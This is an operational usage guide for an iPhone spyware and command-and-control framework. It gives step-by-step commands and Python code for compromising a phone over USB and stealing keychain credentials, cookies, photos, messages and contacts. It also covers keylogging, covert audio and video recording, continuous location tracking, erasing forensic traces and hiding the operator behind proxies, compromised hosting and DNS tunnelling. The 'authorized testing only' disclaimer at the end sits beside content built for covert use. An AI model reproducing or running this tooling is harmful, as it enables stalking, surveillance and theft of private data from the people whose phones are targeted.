# iPhone Remote Access - Complete Usage Guide

## 🚀 Quick Start (3 Steps)

### Step 1: Start C2 Server

```bash
cd /home/haymayndz/MaxPhisher

# Start C2 server
python3 c2_server.py server

# Output:
# [*] Starting C2 server on 0.0.0.0:8443
# [*] Encryption key: gAAAAABl2k3j4...
# [*] Database: /home/haymayndz/MaxPhisher/c2_data.db

# SAVE THE ENCRYPTION KEY!
```

**Keep terminal open** or run in background:
```bash
# Run in background
nohup python3 c2_server.py server > c2.log 2>&1 &

# Or use systemd (recommended)
sudo systemctl start iphone-c2
```

### Step 2: Connect & Compromise iPhone

```bash
# Connect iPhone via USB
# Unlock and tap "Trust This Computer"

# Run compromise script
python3 compromise_iphone.py

# Enter encryption key from Step 1
# Script will auto-detect device and compromise it
```

**What happens:**
- ✅ Detects connected iPhone
- ✅ Checks jailbreak status
- ✅ Extracts credentials (keychain, cookies, passwords)
- ✅ Installs persistence mechanism
- ✅ Registers with C2 server
- ✅ Tests remote control (location, screenshot)

### Step 3: Control iPhone Remotely

```bash
# Launch control panel
python3 control_iphone.py

# Select device from list
# Choose operations from menu
```

---

## 📱 Control Panel Features

### Surveillance Operations

**1. Track Location**
```
Real-time GPS coordinates
Accuracy: ±5-10 meters
Saves to: location_{device_id}_{timestamp}.json
```

**2. Capture Screenshot**
```
Remote screenshot capture
Saves to: screenshot_{device_id}_{timestamp}.png
Works even when device is locked
```

**3. Record Audio**
```
Microphone recording
Duration: Custom (default 60s)
Saves to: audio_{device_id}_{timestamp}.m4a
```

**4. Record Video**
```
Camera recording (front/back)
Duration: Custom (default 30s)
Saves to: video_{device_id}_{timestamp}.mp4
```

**5. Monitor Clipboard**
```
Capture clipboard content
Real-time monitoring
Detects passwords, URLs, sensitive data
```

### Data Exfiltration

**6. Exfiltrate Photos**
```
Extract all photos from device
Saves to: exfiltrated_data/{device_id}/photos/
Includes metadata (EXIF, location)
```

**7. Exfiltrate Messages**
```
Extract iMessages and SMS
Saves to: exfiltrated_data/{device_id}/messages/
Includes contacts, timestamps, attachments
```

**8. Exfiltrate Contacts**
```
Extract contact database
Saves to: contacts_{device_id}_{timestamp}.db
Includes names, numbers, emails, photos
```

**9. Start Keylogger**
```
Capture all keyboard input
Duration: Custom (default 3600s = 1 hour)
Logs passwords, messages, searches
```

### Management

**10. Install App**
```
Install additional apps remotely
Requires IPA URL
Enterprise-signed apps only
```

**11. Cleanup Traces**
```
Remove all forensic evidence:
- Clear system logs
- Remove artifacts
- Reset timestamps
- Clear caches
```

---

## 💻 Command Line Usage

### Basic Operations

```python
import asyncio
from iphone_remote_access import iPhoneRemoteControl

async def main():
    # Initialize
    controller = iPhoneRemoteControl(
        c2_server="http://localhost:8443",
        encryption_key="YOUR_KEY_HERE"
    )
    
    device_id = "00008030-001234567890ABCD"
    
    # Track location
    location = await controller.track_location(device_id)
    print(f"Location: {location}")
    
    # Capture screenshot
    screenshot = await controller.capture_screen(device_id)
    Path("screenshot.png").write_bytes(screenshot)
    
    # Exfiltrate data
    await controller.exfiltrate_photos(device_id)
    await controller.exfiltrate_messages(device_id)
    
    # Start keylogger (1 hour)
    await controller.keylog(device_id, duration=3600)
    
    # Cleanup
    await controller.cleanup_traces(device_id)
    await controller.close()

asyncio.run(main())
```

### Advanced Operations

```python
# Record audio (2 minutes)
result = await controller.execute_command(
    device_id, 'record_audio', {'duration': 120}
)

# Record video (1 minute)
result = await controller.execute_command(
    device_id, 'record_video', {'duration': 60}
)

# Exfiltrate contacts
result = await controller.execute_command(
    device_id, 'exfiltrate_contacts'
)

# Monitor clipboard
result = await controller.execute_command(
    device_id, 'monitor_clipboard'
)

# Track installed apps
result = await controller.execute_command(
    device_id, 'track_apps'
)
```

---

## 🔄 Automated Operations

### Continuous Monitoring Script

```python
#!/usr/bin/env python3
"""
Continuous iPhone monitoring
Tracks location, captures screenshots, monitors clipboard
"""

import asyncio
from datetime import datetime
from pathlib import Path
from iphone_remote_access import iPhoneRemoteControl

async def monitor_device(controller, device_id):
    """Monitor device continuously"""
    
    while True:
        try:
            # Track location every 5 minutes
            location = await controller.track_location(device_id)
            if location:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                Path(f"tracking/location_{timestamp}.json").write_text(
                    json.dumps(location, indent=2)
                )
            
            # Capture screenshot every 10 minutes
            await asyncio.sleep(600)
            screenshot = await controller.capture_screen(device_id)
            if screenshot:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                Path(f"tracking/screenshot_{timestamp}.png").write_bytes(screenshot)
            
            # Monitor clipboard every 2 minutes
            await asyncio.sleep(120)
            clipboard = await controller.execute_command(device_id, 'monitor_clipboard')
            if clipboard and clipboard.get('content'):
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                Path(f"tracking/clipboard_{timestamp}.txt").write_text(
                    clipboard['content']
                )
            
        except Exception as e:
            print(f"[!] Monitoring error: {e}")
            await asyncio.sleep(60)

async def main():
    controller = iPhoneRemoteControl(
        c2_server="http://localhost:8443",
        encryption_key=Path(".encryption_key").read_text().strip()
    )
    
    device_id = "00008030-001234567890ABCD"
    
    Path("tracking").mkdir(exist_ok=True)
    
    await monitor_device(controller, device_id)

if __name__ == "__main__":
    asyncio.run(main())
```

Save as `monitor_iphone.py` and run:
```bash
python3 monitor_iphone.py
```

---

## 📊 Data Management

### View Exfiltrated Data

```bash
# List all exfiltrated data
ls -lah exfiltrated_data/

# View device data
cd exfiltrated_data/00008030-001234567890ABCD/

# Photos
ls -lah photos/

# Messages
ls -lah messages/

# Contacts
sqlite3 contacts_*.db "SELECT * FROM contacts;"
```

### Export Data

```python
#!/usr/bin/env python3
"""Export exfiltrated data to organized format"""

import json
import sqlite3
from pathlib import Path

def export_device_data(device_id):
    """Export all data for a device"""
    
    base_path = Path(f"exfiltrated_data/{device_id}")
    export_path = Path(f"exports/{device_id}")
    export_path.mkdir(parents=True, exist_ok=True)
    
    # Export photos
    photos_dir = base_path / "photos"
    if photos_dir.exists():
        for photo in photos_dir.glob("*.jpg"):
            (export_path / "photos").mkdir(exist_ok=True)
            photo.copy(export_path / "photos" / photo.name)
    
    # Export messages
    messages_dir = base_path / "messages"
    if messages_dir.exists():
        all_messages = []
        for msg_file in messages_dir.glob("*.json"):
            messages = json.loads(msg_file.read_text())
            all_messages.extend(messages)
        
        (export_path / "messages.json").write_text(
            json.dumps(all_messages, indent=2)
        )
    
    # Export contacts
    for contacts_db in base_path.glob("contacts_*.db"):
        conn = sqlite3.connect(str(contacts_db))
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM contacts")
        contacts = cursor.fetchall()
        conn.close()
        
        (export_path / "contacts.json").write_text(
            json.dumps(contacts, indent=2)
        )
    
    print(f"[+] Data exported to: {export_path}")

# Usage
export_device_data("00008030-001234567890ABCD")
```

---

## 🔧 Troubleshooting

### Device Not Detected

```bash
# Check USB connection
idevice_id -l

# If empty, check usbmuxd
sudo systemctl status usbmuxd
sudo systemctl restart usbmuxd

# Try different USB port/cable
# Unlock iPhone and tap "Trust This Computer"
```

### C2 Connection Failed

```bash
# Check C2 server status
sudo systemctl status iphone-c2

# View C2 logs
sudo journalctl -u iphone-c2 -f

# Test C2 connectivity
curl http://localhost:8443/health

# Check firewall
sudo ufw status
```

### Commands Not Executing

```bash
# Check device online status
python3 control_iphone.py
# Device should show 🟢 ONLINE

# View C2 database
sqlite3 c2_data.db "SELECT * FROM devices;"
sqlite3 c2_data.db "SELECT * FROM commands WHERE status='pending';"

# Check device agent (jailbroken only)
ssh root@device-ip "ps aux | grep iphone_agent"
```

### Exfiltration Failing

```bash
# Check available space
df -h exfiltrated_data/

# Check permissions
ls -la exfiltrated_data/

# Reduce chunk size in code
# Edit iphone_remote_access.py:
# chunk_size = 32 * 1024  # Reduce from 64KB to 32KB
```

---

## 🛡️ OPSEC Best Practices

### Infrastructure Security

```bash
# Always use VPN/Tor for C2 access
# Never access C2 from your real IP

# Use residential proxies
export http_proxy="http://user:pass@proxy.dataimpulse.com:8080"
export https_proxy="http://user:pass@proxy.dataimpulse.com:8080"

# Rotate C2 domains regularly
# Use bulletproof hosting or compromised servers
```

### Data Security

```bash
# Encrypt exfiltrated data
tar -czf data.tar.gz exfiltrated_data/
openssl enc -aes-256-cbc -salt -in data.tar.gz -out data.tar.gz.enc
rm data.tar.gz

# Secure delete original data
shred -vfz -n 10 exfiltrated_data/*

# Use encrypted storage
cryptsetup luksFormat /dev/sdX
cryptsetup luksOpen /dev/sdX encrypted_storage
```

### Attribution Masking

```python
# Randomize user agents
user_agents = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)',
    'SystemService/1.0'
]

# Randomize timing
import random
await asyncio.sleep(random.uniform(60, 300))

# Use covert channels
from iphone_remote_access import CovertChannel
covert = CovertChannel()
await covert._dns_tunnel(data, "your-domain.com")
```

---

## 📈 Monitoring & Analytics

### Device Status Dashboard

```python
#!/usr/bin/env python3
"""Real-time device monitoring dashboard"""

import asyncio
from datetime import datetime
from c2_server import C2Client

async def dashboard():
    client = C2Client("http://localhost:8443")
    
    while True:
        devices = await client.list_devices()
        
        # Clear screen
        print("\033[2J\033[H")
        
        print("="*80)
        print(f"iPhone C2 Dashboard - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*80)
        
        online = sum(1 for d in devices if d['online'])
        offline = len(devices) - online
        
        print(f"\nDevices: {len(devices)} total | {online} online | {offline} offline")
        print("\n" + "="*80)
        
        for device in devices:
            status = "🟢" if device['online'] else "🔴"
            last_seen = datetime.fromtimestamp(device['last_seen'])
            time_diff = datetime.now() - last_seen
            
            print(f"\n{status} {device['device_id']}")
            print(f"   Last seen: {time_diff.seconds//60}m ago")
            
            info = device.get('info', {})
            if 'status' in info:
                print(f"   iOS: {info['status'].get('ios_version', 'Unknown')}")
        
        await asyncio.sleep(10)

asyncio.run(dashboard())
```

---

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

Unauthorized access to devices is illegal. Use only:
- ✅ On devices you own
- ✅ With explicit written authorization
- ✅ For legitimate security research
- ✅ In controlled environments

**Violations may result in:**
- Criminal prosecution
- Civil liability
- Imprisonment
- Substantial fines

---

## 📞 Quick Reference

### Essential Commands

```bash
# Start C2 server
python3 c2_server.py server

# Compromise device
python3 compromise_iphone.py

# Control device
python3 control_iphone.py

# Monitor device
python3 monitor_iphone.py

# View logs
sudo journalctl -u iphone-c2 -f

# Check status
sudo systemctl status iphone-c2
```

### File Locations

```
/home/haymayndz/MaxPhisher/
├── c2_data.db                    # C2 database
├── .encryption_key               # Encryption key
├── exfiltrated_data/             # Exfiltrated data
│   └── {device_id}/
│       ├── photos/
│       ├── messages/
│       └── contacts/
└── tracking/                     # Monitoring data
    ├── location_*.json
    ├── screenshot_*.png
    └── clipboard_*.txt
```

---

**Framework Version**: 1.0.0  
**Last Updated**: 2025-01-26  
**Compatibility**: iOS 14.0 - 17.x
